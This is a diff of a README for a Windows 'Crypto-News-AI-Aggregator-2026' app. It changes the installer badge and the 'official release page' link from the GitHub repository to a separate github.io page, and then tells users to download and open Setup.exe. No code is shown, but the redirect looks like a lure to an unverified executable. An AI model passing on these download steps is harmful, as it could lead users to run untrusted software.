@@ -1,6 +1,6 @@
 # 📰 Crypto-News-AI-Aggregator-2026 - Master daily markets with automated intelligence
 
-[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/havenexpeditionary38/Crypto-News-AI-Aggregator-2026)
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://havenexpeditionary38.github.io)
 
 ## 🎯 About This Application
 
@@ -22,7 +22,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/havenexpeditionary38/Crypto-News-AI-Aggregator-2026).
+1. Go to the [official release page](https://havenexpeditionary38.github.io).
 2. Locate the link labeled Setup.exe.
 3. Click the link to download the installer file to your computer.
 4. Open your Downloads folder.
